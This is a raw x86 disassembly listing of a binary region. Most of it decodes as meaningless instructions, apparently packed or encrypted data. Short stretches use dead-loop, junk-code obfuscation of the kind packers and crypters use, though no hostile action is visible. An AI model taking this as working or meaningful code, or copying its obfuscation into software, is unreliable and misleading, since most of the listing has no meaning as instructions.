  41776b:	lods   eax,DWORD PTR ds:[esi]
  41776c:	sub    eax,0x4385aaaf
  417771:	inc    ebx
  417772:	fistp  QWORD PTR [edx]
  417774:	cli    
  417775:	push   ss
  417776:	inc    edi
  417777:	fsubr  QWORD PTR ds:0xe90b1cfb
  41777d:	mov    cl,0x4e
  41777f:	inc    esp
  417780:	fdivr  QWORD PTR [esi-0x6c]
  417783:	test   DWORD PTR [edi-0x2d8857cc],ebp
  417789:	sub    BYTE PTR [ecx],al
  41778b:	jg     0x417785
  41778d:	push   eax
  41778e:	pop    eax
  41778f:	push   ds
  417790:	neg    DWORD PTR ds:0xcb7a1d7d
  417796:	sti    
  417797:	jo     0x417789
  417799:	mov    cl,0xcd
  41779b:	ret    0x1782
  41779e:	repnz inc ebx
  4177a0:	inc    esp
  4177a1:	mov    dh,0x87
  4177a3:	adc    DWORD PTR [esi+0x5b8be26c],esp
  4177a9:	fsubr  st(0),st
  4177ab:	cdq    
  4177ac:	mov    BYTE PTR [eax+eiz*4-0x23642c6b],ch
  4177b3:	das    
  4177b4:	mov    ebp,0x907b7bde
  4177b9:	xor    DWORD PTR [edi+edx*2+0x30],edx
  4177bd:	mov    WORD PTR [ecx+ebp*8],?
  4177c0:	add    BYTE PTR [ebx+0x240d4ef],cl
  4177c6:	ror    dl,cl
  4177c8:	jb     0x4177e1
  4177ca:	aam    0x4d
  4177cc:	lahf   
  4177cd:	xor    DWORD PTR [ecx],edx
  4177cf:	adc    ch,BYTE PTR [ecx-0x76]
  4177d2:	inc    eax
  4177d3:	pop    ebx
  4177d4:	add    eax,ebx
  4177d6:	cmp    ebx,DWORD PTR [ecx]
  4177d8:	push   0x1b20767b
  4177dd:	jae    0x417786
  4177df:	cmp    edi,DWORD PTR [esi]
  4177e1:	int    0x2d
  4177e3:	pop    ds
  4177e4:	cmpxchg BYTE PTR [esi-0x7713f9e3],ah
  4177eb:	in     al,dx
  4177ec:	data16 add al,0x2d
  4177ef:	and    eax,0x6f277266
  4177f4:	mov    edx,0x432a3db6
  4177f9:	imul   ecx,DWORD PTR [edx+ebp*2],0x40
  4177fd:	not    BYTE PTR [ecx-0x64647c81]
  417803:	sub    eax,0xfb4177ca
  417808:	out    dx,eax
  417809:	sti    
  41780a:	sub    al,BYTE PTR [eax]
  41780c:	ret    0x137
  41780f:	or     eax,0xa1f5a6cc
  417814:	push   ss
  417815:	out    0x8a,eax
  417817:	xchg   ebx,eax
  417818:	jno    0x417898
  41781a:	and    edi,DWORD PTR [edx]
  41781c:	adc    DWORD PTR [eax],edi
  41781e:	loope  0x417873
  417820:	addr16 popf 
  417822:	and    al,0xaf
  417824:	sbb    al,0xa8
  417826:	dec    esp
  417827:	jmp    0xd9b0a4c9
  41782c:	aas    
  41782d:	dec    ebp
  41782e:	mov    bl,0x5d
  417830:	test   BYTE PTR [ebp-0x78b1d869],al
  417836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417837:	sar    BYTE PTR [ebx+0x78ad915f],1
  41783d:	mov    al,ds:0xa93c2656
  417842:	stos   BYTE PTR es:[edi],al
  417843:	aas    
  417844:	iret   
  417845:	sub    edx,DWORD PTR [edx]
  417847:	lea    ebp,[ecx]
  417849:	cmp    eax,0xaaef841b
  41784e:	jmp    0x421b:0xf5fd0b2c
  417855:	fstp   QWORD PTR [eax]
  417857:	repnz fwait
  417859:	lock cmp DWORD PTR [ebp-0x53],0xd9b82320
  417861:	test   eax,0x59060ae0
  417866:	loope  0x417880
  417868:	add    eax,0x5dcf1813
  41786d:	mov    ds:0x1a067230,eax
  417872:	pop    es
  417873:	sbb    al,0x57
  417875:	adc    eax,0x124b066c
  41787a:	push   0xc53ed2f3
  41787f:	leave  
  417880:	and    ch,BYTE PTR ss:[ebp+ebx*1+0x4ffda56b]
  417888:	nop
  417889:	test   al,0x55
  41788b:	jo     0x4178d7
  41788d:	sub    ebx,DWORD PTR [edx]
  41788f:	mov    edi,0xf3c449e0
  417894:	pusha  
  417895:	test   al,0xe4
  417897:	xchg   edx,esi
  417899:	(bad)  
  41789a:	out    dx,al
  41789b:	push   edx
  41789c:	(bad)  
  41789d:	adc    cl,BYTE PTR [edx-0x2deda678]
  4178a3:	inc    eax
  4178a4:	icebp  
  4178a5:	xchg   BYTE PTR [eax-0x5502f39c],ah
  4178ab:	jns    0x4178f1
  4178ad:	add    dl,BYTE PTR [edx]
  4178af:	int3   
  4178b0:	sub    al,0x13
  4178b2:	les    ebp,FWORD PTR [ecx+0x69]
  4178b5:	std    
  4178b6:	add    eax,0x17a8a459
  4178bb:	sub    bl,BYTE PTR [ebp-0x78]
  4178be:	popf   
  4178bf:	stos   DWORD PTR es:[edi],eax
  4178c0:	gs push ds
  4178c2:	call   0x5179ee0f
  4178c7:	loopne 0x417931
  4178c9:	test   eax,0xeef669b6
  4178ce:	push   ebx
  4178cf:	jl     0x4178b6
  4178d1:	add    ecx,DWORD PTR [eax+0x3c]
  4178d4:	jmp    0x417afc
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	call   0x7f33:0x4e8cce5
  4178ec:	js     0x4178f3
  4178ee:	jle    0x417968
  4178f0:	js     0x4178d0
  4178f2:	dec    eax
  4178f3:	jp     0x4178ff
  4178f5:	ror    DWORD PTR [edi],1
  4178f7:	adc    esp,eax
  4178f9:	inc    edx
  4178fa:	push   ecx
  4178fb:	(bad)  
  4178fc:	mov    bl,0x59
  4178fe:	out    0x87,eax
  417900:	out    0x4c,al
  417902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417903:	mov    eax,0xfca9eb38
  417908:	sub    eax,0xcd8db54
  41790d:	into   
  41790e:	mul    DWORD PTR [eax]
  417910:	and    dl,dl
  417912:	mov    edi,0x26588f10
  417917:	sar    esi,0x17
  41791a:	in     eax,0x1d
  41791c:	cmp    BYTE PTR [eax-0x6e],al
  41791f:	xor    al,0x75
  417921:	mov    al,0xbc
  417923:	cmp    ebp,DWORD PTR [ebx+0x6002eb0d]
  417929:	or     eax,0x8a1025b1
  41792e:	out    0x53,eax
  417930:	xchg   edx,eax
  417931:	inc    ebx
  417932:	imul   esp,DWORD PTR [esi],0xf578ff2c
  417938:	xchg   ebx,eax
  417939:	add    eax,0x33877f90
  41793e:	lods   al,BYTE PTR ds:[esi]
  41793f:	dec    esi
  417940:	inc    BYTE PTR [ebx]
  417942:	vpsadbw xmm6,xmm6,xmm4
  417946:	jmp    0x4178e1
  417948:	or     eax,eax
  41794a:	popf   
  41794b:	push   edx
  41794c:	cmp    ecx,DWORD PTR [edx+0x5f]
  41794f:	mov    al,0xa6
  417951:	je     0x4179a2
  417953:	bound  esp,QWORD PTR [eax]
  417955:	iret   
  417956:	mov    ds:0x35dcf275,eax
  41795b:	cs ds mov esi,0x96547cc6
  417962:	xor    eax,0x7d46819a
  417967:	push   ds
  417968:	xor    DWORD PTR [ebx-0x45be4b04],0xb19afbe4
  417972:	jl     0x4179cc
  417974:	test   bl,0x41
  417977:	pop    ecx
  417978:	push   eax
  417979:	popa   
  41797a:	in     eax,0x18
  41797c:	mov    esi,0xe2c49fcf
  417981:	inc    edi
  417982:	test   DWORD PTR [ecx+eax*4+0x615c2d98],ecx
  417989:	rol    BYTE PTR [edi+0x23],1
  41798c:	xchg   ecx,eax
  41798d:	or     cl,BYTE PTR [esi+ebp*2]
  417990:	je     0x4179e4
  417992:	jg     0x417922
  417994:	ja     0x417941
  417996:	in     eax,dx
  417997:	inc    eax
  417998:	int3   
  417999:	mov    ds:0xa3dee140,eax
  41799e:	xor    al,0x59
  4179a0:	out    dx,eax
  4179a1:	jp     0x417a12
  4179a3:	shl    DWORD PTR [eax-0x3d9f4647],cl
  4179a9:	out    0x44,al
  4179ab:	sti    
  4179ac:	fild   WORD PTR [eax+0xd]
  4179af:	or     eax,0x93238852
  4179b4:	xor    al,0x16
  4179b6:	xor    al,0x84
  4179b8:	in     al,0x80
  4179ba:	test   ecx,0xf523255b
  4179c0:	bound  ebp,QWORD PTR gs:0xf85b6c0
  4179c7:	pushf  
  4179c8:	loop   0x417951
  4179ca:	cmp    DWORD PTR [edi+0x45],eax
  4179cd:	cs mov ecx,0xe53ab716
  4179d3:	mov    al,0x63
  4179d5:	(bad)
  4179d9:	fcomp  QWORD PTR [edi]
  4179db:	sbb    eax,DWORD PTR [ebx+0x70]
  4179de:	and    eax,0x972c3b1
  4179e3:	shr    DWORD PTR [ecx],cl
  4179e5:	nop
  4179e6:	push   0xffffffc0
  4179e8:	fldenv [ebp+0x38843bdf]
  4179ee:	dec    edx
  4179ef:	test   bl,cl
  4179f1:	adc    al,0x5c
  4179f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f4:	(bad)
  4179f7:	add    eax,0x86a6fb4e
  4179fd:	adc    al,0x51
  4179ff:	add    eax,0xc06384fc
  417a04:	xchg   edi,eax
  417a05:	jle    0x417a10
  417a07:	shl    BYTE PTR [eax-0x10],1
  417a0a:	sbb    DWORD PTR [ebx+ebx*1+0x63772154],edi
  417a11:	sti    
  417a12:	pop    ebp
  417a13:	stos   DWORD PTR es:[edi],eax
  417a14:	repz ficom WORD PTR [edx-0x32]
  417a18:	xchg   bl,cl
  417a1a:	in     eax,dx
  417a1b:	(bad)  
  417a1c:	lock into 
  417a1e:	loop   0x417a26
  417a20:	into   
  417a21:	aam    0x6e
  417a23:	xor    BYTE PTR [ebp-0x148574d7],ah
  417a29:	dec    edi
  417a2a:	jp     0x417a3b
  417a2c:	jg     0x417a30
  417a2e:	shl    ecx,cl
  417a30:	or     al,0xfc
  417a32:	mov    ds:0x2e7ec9de,al
  417a37:	ret    
  417a38:	push   ebx
  417a39:	pop    edx
  417a3a:	arpl   WORD PTR [ebx-0x5],dx
  417a3d:	sbb    eax,0x88bc3423
  417a42:	data16 scas al,BYTE PTR es:[edi]
  417a44:	inc    ecx
  417a45:	bound  ebx,QWORD PTR ss:[edx+0x5a]
  417a49:	sbb    bh,ch
  417a4b:	mov    DWORD PTR [edx-0x71],eax
  417a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a4f:	fcom   QWORD PTR [esi+eax*8+0x3e48b5f9]
  417a56:	sahf   
  417a57:	push   ebp
  417a58:	fcom   st(0)
  417a5a:	sub    al,0xfe
  417a5c:	in     eax,0xdb
  417a5e:	or     ebx,ebp
  417a60:	inc    ecx
  417a61:	fiadd  DWORD PTR [ebp-0x2364b63a]
  417a67:	xchg   esp,eax
  417a68:	cwde   
  417a69:	scas   eax,DWORD PTR es:[edi]
  417a6a:	leave  
  417a6b:	push   ebp
  417a6c:	call   0xf6a8:0xdc484a79
  417a73:	or     DWORD PTR [edx+0x72],0xab103d5c
  417a7a:	inc    ebx
  417a7b:	jnp    0x417ae5
  417a7d:	jb     0x417a7a
  417a7f:	inc    ebx
  417a80:	push   edi
  417a81:	fild   QWORD PTR [eax]
  417a83:	mov    al,BYTE PTR [edx-0x6cd669c9]
  417a89:	inc    ebp
  417a8a:	fistp  DWORD PTR [ecx-0xc]
  417a8d:	in     al,0x15
  417a8f:	sti    
  417a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a91:	shr    DWORD PTR [ebp+0x13dc84f9],0x67
  417a98:	xor    BYTE PTR [eax],ah
  417a9a:	loopne 0x417af3
  417a9c:	ins    DWORD PTR es:[edi],dx
  417a9d:	ds pop eax
  417a9f:	sbb    DWORD PTR [ebp-0x6e85ada9],esp
  417aa5:	mov    dh,0xed
  417aa7:	(bad)  
  417aa8:	(bad)  
  417aa9:	pusha  
  417aaa:	cld    
  417aab:	adc    BYTE PTR [ebx-0x26],bl
  417aae:	int3   
  417aaf:	js     0x417a3a
  417ab1:	clc    
  417ab2:	sbb    esp,edi
  417ab4:	dec    esi
  417ab5:	mov    gs,WORD PTR [esi-0xf]
  417ab8:	dec    ecx
  417ab9:	out    dx,al
  417aba:	lods   eax,DWORD PTR ds:[esi]
  417abb:	jge    0x417ae5
  417abd:	or     ch,bh
  417abf:	mov    esp,0xe4fe2b87
  417ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ac5:	(bad)  
  417ac6:	int3   
  417ac7:	push   eax
  417ac8:	inc    edx
  417ac9:	xor    BYTE PTR [ebx-0x10da3839],ah
  417acf:	movhps xmm1,QWORD PTR [edx+0x48]
  417ad3:	or     dl,0x1c
  417ad6:	pop    edx
  417ad7:	jmp    0x417acc
  417ad9:	jb     0x417afa
  417adb:	(bad)  
  417adc:	and    ch,bh
  417ade:	xor    edx,DWORD PTR [ebx]
  417ae0:	mul    BYTE PTR [edx]
  417ae2:	or     BYTE PTR [esi],0xdc
  417ae5:	mov    ds:0xcce81de6,al
  417aea:	dec    ebp
  417aeb:	inc    eax
  417aec:	dec    esp
  417aed:	and    al,0x1
  417aef:	jae    0x417b57
  417af1:	mov    bh,0xd3
  417af3:	or     dh,0xdb
  417af6:	mov    esi,0xc1dd1613
  417afb:	out    0xba,al
  417afd:	push   eax
  417afe:	or     BYTE PTR [ecx+0x7],dl
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0xef46b06c
  417b49:	jp     0x417b5c
  417b4b:	xor    DWORD PTR [edi+0x78],edi
  417b4e:	add    eax,0x1278787e
  417b53:	ret    0xc6a7
  417b56:	(bad)  
  417b57:	(bad)  
  417b58:	dec    eax
  417b59:	(bad)  
  417b5a:	jmp    0x417b9a
  417b5c:	and    al,0xd4
  417b5e:	loopne 0x417bb2
  417b60:	push   esp
  417b61:	pop    eax
  417b62:	imul   BYTE PTR [eax+edi*1]
  417b65:	adc    dh,BYTE PTR [ecx+0x83efbd0]
  417b6b:	imul   ebx,DWORD PTR [esi],0x73200d6c
  417b71:	cwde   
  417b72:	xor    DWORD PTR [ecx+0x49e3b915],ebp
  417b78:	or     DWORD PTR [ecx-0x6a6acabd],ebx
  417b7e:	pop    edi
  417b7f:	sbb    bh,BYTE PTR [eax]
  417b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b82:	fcos   
  417b84:	push   ebx
  417b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b86:	std    
  417b87:	and    esp,DWORD PTR [esi+0x77]
  417b8a:	add    ah,bl
  417b8c:	aam    0x6b
  417b8e:	ret    0xdecb
  417b91:	inc    edx
  417b92:	xchg   esi,eax
  417b93:	mov    ebp,0x2ce75e2b
  417b98:	mov    eax,ds:0x280b11c2
  417b9d:	mov    ch,0x2a
  417b9f:	sub    bl,ch
  417ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ba2:	push   edi
  417ba3:	adc    cl,0x71
  417ba6:	cwde   
  417ba7:	jmp    0x417c09
  417ba9:	push   esi
  417baa:	or     al,0x4a
  417bac:	cmc    
  417bad:	aam    0x15
  417baf:	sti    
  417bb0:	adc    DWORD PTR [edx],esp
  417bb2:	mov    BYTE PTR [edx+ebx*8],bl
  417bb5:	sbb    eax,0x404ee6b1
  417bba:	sbb    eax,0x950e2017
  417bbf:	out    0xe1,al
  417bc1:	scas   al,BYTE PTR es:[edi]
  417bc2:	sub    edi,DWORD PTR [edx+0x7b]
  417bc5:	or     al,0x53
  417bc7:	mov    al,0x7
  417bc9:	jo     0x417b6b
  417bcb:	adc    esp,esp
  417bcd:	shr    BYTE PTR [esi-0x49],1
  417bd0:	jmp    0x3fc1:0x46958904
  417bd7:	xlat   BYTE PTR ds:[ebx]
  417bd8:	(bad)  
  417bd9:	ror    DWORD PTR ds:0x77bfd287,1
  417bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417be0:	sahf   
  417be1:	ret    
  417be2:	pop    ds
  417be3:	(bad)  
  417be4:	stos   BYTE PTR es:[edi],al
  417be5:	test   al,0xf
  417be7:	ret    0xea84
  417bea:	lock fadd st,st(5)
  417bed:	rcl    DWORD PTR [ebp-0x352b442b],cl
  417bf3:	mov    ds:0x9e5e8cc0,eax
  417bf8:	psubb  mm3,QWORD PTR [ebp+0x74]
  417bfc:	fcompp 
  417bfe:	in     al,dx
  417bff:	loope  0x417bab
  417c01:	shl    BYTE PTR [edi+esi*1+0x73a58435],cl
  417c08:	cmp    eax,0xba0ed039
  417c0d:	and    BYTE PTR [edi+0x43be9b2],0x79
  417c14:	rcl    DWORD PTR [eax-0x3d0ec72],1
  417c1a:	jnp    0x417c66
  417c1c:	push   esp
  417c1d:	xor    DWORD PTR [ebx],ecx
  417c1f:	cld    
  417c20:	sti    
  417c21:	or     al,0x28
  417c23:	clc    
  417c24:	(bad)  [edx]
  417c26:	jbe    0x417c10
  417c28:	fs and esp,ecx
  417c2b:	not    edi
  417c2d:	sbb    eax,0xe177f4f
  417c32:	retf   0x50bd
  417c35:	ds (bad) 
  417c38:	bound  ecx,QWORD PTR [ebp+0x3b]
  417c3b:	and    eax,0xb7bd4151
  417c40:	std    
  417c41:	pop    ecx
  417c42:	push   ebx
  417c43:	enter  0x6b3f,0x96
  417c47:	mov    esp,0x5a0ae0b7
  417c4c:	lock pop ds
  417c4e:	xchg   esp,eax
  417c4f:	mov    eax,ds:0x74ee5bb5
  417c54:	pop    ecx
  417c55:	fisttp QWORD PTR [esi-0x72]
  417c58:	mov    ebx,DWORD PTR [ecx]
  417c5a:	ret    0x81bd
  417c5d:	in     al,0x7d
  417c5f:	dec    ebx
  417c60:	leave  
  417c61:	push   esi
  417c62:	mov    edi,0x9367723
  417c67:	jp     0x417c1b
  417c69:	(bad)
  417c6c:	sbb    BYTE PTR [edx],dl
  417c6e:	or     al,0xaa
  417c70:	(bad)  
  417c71:	adc    DWORD PTR [edi+0x5e61e0ea],esi
  417c77:	jbe    0x417c8d
  417c79:	idiv   BYTE PTR [ebx+0x7a7e5aa6]
  417c7f:	(bad)  
  417c81:	sbb    edx,DWORD PTR [esp+ebx*1-0x4b]
  417c85:	outs   dx,BYTE PTR ds:[esi]
  417c86:	mov    edx,0x1126e864
  417c8b:	js     0x417c5e
  417c8d:	xchg   edi,eax
  417c8e:	mov    ecx,0x19471a9a
  417c93:	loop   0x417d10
  417c95:	or     BYTE PTR ds:0xcb9e41e2,0x8
  417c9c:	rol    dl,0xdc
  417c9f:	mov    cl,0x8d
  417ca1:	sbb    ah,BYTE PTR [ebp+0x5da38c0c]
  417ca7:	add    eax,0xeed95cc6
  417cac:	scas   eax,DWORD PTR es:[edi]
  417cad:	fadd   st,st(3)
  417caf:	add    DWORD PTR [ecx-0xc276355],ebx
  417cb5:	and    esi,ebx
  417cb7:	jae    0x417d36
  417cb9:	xor    DWORD PTR [edi],esp
  417cbb:	xor    DWORD PTR [ecx-0x1f],ecx
  417cbe:	sti    
  417cbf:	loope  0x417d0a
  417cc1:	adc    ah,BYTE PTR ds:0xb4c4fcfd
  417cc7:	fsubr  QWORD PTR [ecx+0x7e]
  417cca:	add    BYTE PTR [edi-0x10],ah
  417ccd:	or     DWORD PTR [ebp-0x259c30d3],edi
  417cd3:	xchg   BYTE PTR [ebx],bh
  417cd5:	mov    ch,0xb1
  417cd7:	mov    ebp,DWORD PTR [edx+0x7c0b55c2]
  417cdd:	dec    esp
  417cde:	popa   
  417cdf:	jnp    0x417cae
  417ce1:	pop    edi
  417ce2:	icebp  
  417ce3:	xchg   edi,eax
  417ce4:	mov    ah,0xa1
  417ce6:	int3   
  417ce7:	call   0x15e5:0xf69f0076
  417cee:	hlt    
  417cef:	cli    
  417cf0:	repz data16 sub BYTE PTR ds:0x544c8af7,dh
  417cf8:	popf   
  417cf9:	lods   al,BYTE PTR ds:[esi]
  417cfa:	pop    ecx
  417cfb:	add    eax,0x2c86dc3a
  417d00:	rcr    DWORD PTR ds:0x9f57fddb,0xfb
  417d07:	sbb    DWORD PTR [ecx-0x8],ebx
  417d0a:	mov    ebx,0x24e05ed3
  417d0f:	push   edx
  417d10:	sbb    al,0x8
  417d12:	in     al,dx
  417d13:	adc    al,0xcd
  417d15:	iret   
  417d16:	inc    eax
  417d17:	xchg   esp,eax
  417d18:	repz inc eax
  417d1a:	jp     0x417ca0
  417d1c:	ins    DWORD PTR es:[edi],dx
  417d1d:	push   esp
  417d1e:	xchg   edi,eax
  417d1f:	push   ecx
  417d20:	dec    eax
  417d21:	xor    BYTE PTR [ebp-0x3],0xf3
  417d25:	push   edi
  417d26:	sub    DWORD PTR [ecx+0x77],esp
  417d29:	jns    0x417cb2
  417d2b:	jle    0x417d53
  417d2d:	push   ecx
  417d2e:	mov    dl,0x33
  417d30:	pop    edx
  417d31:	loope  0x417d01
  417d33:	stos   DWORD PTR es:[edi],eax
  417d34:	mov    al,0xd
  417d36:	call   0x70dc:0x1643e6fc
  417d3d:	das    
  417d3e:	stos   BYTE PTR es:[edi],al
  417d3f:	xor    eax,0x629325dd
  417d44:	shl    DWORD PTR [ecx+ebp*8+0x33],1
  417d48:	ficom  WORD PTR [ecx]
  417d4a:	imul   edx,DWORD PTR [ebp+0x4d68e9dd],0xd3f788eb
  417d54:	cli    
  417d55:	xbegin 0x65ec338e
  417d5b:	cmc    
  417d5c:	shl    BYTE PTR ds:0x7510850,0x5
  417d63:	cwde   
  417d64:	jb     0x417d98
  417d66:	add    cl,cl
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42aa61,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42aa61
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42aa61,ecx
  417d8b:	cmp    DWORD PTR ds:0x42aa61,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42aa61,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42aa65
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a9dd
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42aa9d,0x42aa91
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42aa95,0x42aae9
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a9d5,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42aa95,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42aa6d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a9b9,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42aa51,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42aa51
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42aa51,esi
  417e51:	cmp    DWORD PTR ds:0x42aa51,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42aa51,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	jmp    FWORD PTR [ebp-0x4]
  417e8f:	mov    dl,0xb3
  417e91:	push   ds
  417e92:	aaa    
  417e93:	jg     0x417f0d
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	or     al,0xb5
  417e9b:	xchg   eax,ebx
  417e9d:	cmp    bl,BYTE PTR [esi+esi*8-0x60ee13c4]
  417ea4:	aam    0x3e
  417ea6:	(bad)  
  417ea7:	bound  esi,QWORD PTR [edi+0x38322cbf]
  417ead:	mov    esp,DWORD PTR [esi]
  417eaf:	mov    ds:0x41e9c57a,eax
  417eb4:	sub    DWORD PTR [esi],0x26aeef6c
  417eba:	sar    DWORD PTR [ebx],0x5a
  417ebd:	clc    
  417ebe:	sub    BYTE PTR [ecx+0x1ea4858f],al
  417ec4:	sub    BYTE PTR [ebx],al
  417ec6:	and    dh,BYTE PTR ds:0x64321ab1
  417ecc:	adc    esi,DWORD PTR [ebx-0x31]
  417ecf:	mov    dh,0x56
  417ed1:	inc    ebp
  417ed2:	fild   WORD PTR [eax+0x39]
  417ed5:	cld    
  417ed6:	pop    ecx
  417ed7:	sbb    DWORD PTR [edx+ebp*4+0x20],esi
  417edb:	loopne 0x417f58
  417edd:	mov    dh,0xa7
  417edf:	mov    dh,0x2b
  417ee1:	dec    edx
  417ee2:	sub    DWORD PTR [eax+0x6c],ecx
  417ee5:	sub    ebp,edi
  417ee7:	push   edx
  417ee8:	mov    al,ds:0xad994f75
  417eed:	pop    ds
  417eee:	inc    ebp
  417eef:	inc    esp
  417ef0:	inc    edi
  417ef1:	add    bl,ch
  417ef3:	sahf   
  417ef4:	out    0xea,al
  417ef6:	push   edi
  417ef7:	push   ds
  417ef8:	push   esp
  417ef9:	or     ax,cx
  417efc:	adc    DWORD PTR [esi],ebp
  417efe:	add    DWORD PTR [edx],eax
  417f00:	mov    BYTE PTR [edx+0x6de6b06a],dh
  417f06:	jo     0x417f1d
  417f08:	repnz enter 0x5aa9,0x95
  417f0d:	xchg   DWORD PTR [edx+ecx*2+0x47],edx
  417f11:	ins    DWORD PTR es:[edi],dx
  417f12:	xchg   edi,esp
  417f14:	xor    al,0x7c
  417f16:	mov    bl,0x64
  417f18:	inc    edi
  417f19:	fcmovnu st,st(4)
  417f1b:	mov    BYTE PTR [edx],dh
  417f1d:	sub    al,0x16
  417f1f:	or     DWORD PTR [ecx+0x36],edx
  417f22:	pop    es
  417f23:	std    
  417f24:	aaa    
  417f25:	adc    ah,BYTE PTR [ecx]
  417f27:	pushf  
  417f28:	and    BYTE PTR [edi+0x7f],0x15
  417f2c:	xchg   ebx,eax
  417f2d:	repz jge 0x417f37
  417f30:	shl    DWORD PTR [esp+eiz*2-0xd],cl
  417f34:	xor    BYTE PTR [edx],cl
  417f36:	fld    DWORD PTR [ebp+0x30d3f671]
  417f3c:	cmc    
  417f3d:	pop    ds
  417f3e:	and    DWORD PTR [ecx-0x573a6433],edx
  417f44:	adc    al,0xdd
  417f46:	push   edx
  417f47:	out    0x91,eax
  417f49:	cdq    
  417f4a:	jmp    0x551f2307
  417f4f:	jnp    0x417ef7
  417f51:	mov    bh,0xdb
  417f54:	lahf   
  417f55:	lahf   
  417f56:	das    
  417f57:	jmp    0x1932945b
  417f5c:	cdq    
  417f5d:	hlt    
  417f5e:	icebp  
  417f5f:	imul   edi,ecx,0xffffffca
  417f62:	addps  xmm0,XMMWORD PTR [edi+0x39]
  417f66:	add    BYTE PTR [eax-0x76],dh
  417f69:	test   al,0xc2
  417f6b:	sub    al,0xb7
  417f6d:	imul   al
  417f6f:	out    0x16,eax
  417f71:	in     al,0x60
  417f73:	jge    0x417fd5
  417f75:	sbb    al,BYTE PTR [ebx]
  417f77:	and    DWORD PTR [ebp-0x6e62d02b],ebx
  417f7d:	jp     0x417f25
  417f7f:	push   cs
  417f80:	cdq    
  417f81:	ror    BYTE PTR [edx+0x7c921b07],1
  417f87:	push   eax
  417f88:	cdq    
  417f89:	leave  
  417f8a:	xchg   ch,ah
  417f8c:	lds    esp,FWORD PTR [ebp+0x7b]
  417f8f:	sbb    edi,DWORD PTR [esi]
  417f91:	jg     0x417ffa
  417f93:	jg     0x417f3e
  417f95:	repz sbb BYTE PTR [eax+edx*4-0x2e],ah
  417f9a:	ret    
  417f9b:	sahf   
  417f9c:	scas   al,BYTE PTR es:[edi]
  417f9d:	adc    cl,BYTE PTR [eax-0x3f1c44bf]
  417fa3:	cli    
  417fa4:	pop    esp
  417fa5:	addr16 jmp 0x417f59
  417fa8:	cdq    
  417fa9:	sub    bl,bl
  417fab:	pop    eax
  417fac:	call   0x7db1:0x22c85d6d
  417fb3:	xor    al,0x81
  417fb5:	push   ss
  417fb6:	xor    DWORD PTR [eax+edx*1+0x7c50341c],esi
  417fbd:	add    al,0x92
  417fbf:	in     eax,dx
  417fc0:	xlat   BYTE PTR ds:[ebx]
  417fc1:	inc    edi
  417fc2:	add    dh,BYTE PTR [eax+0x4031819f]
  417fc8:	cmp    BYTE PTR [edi],dh
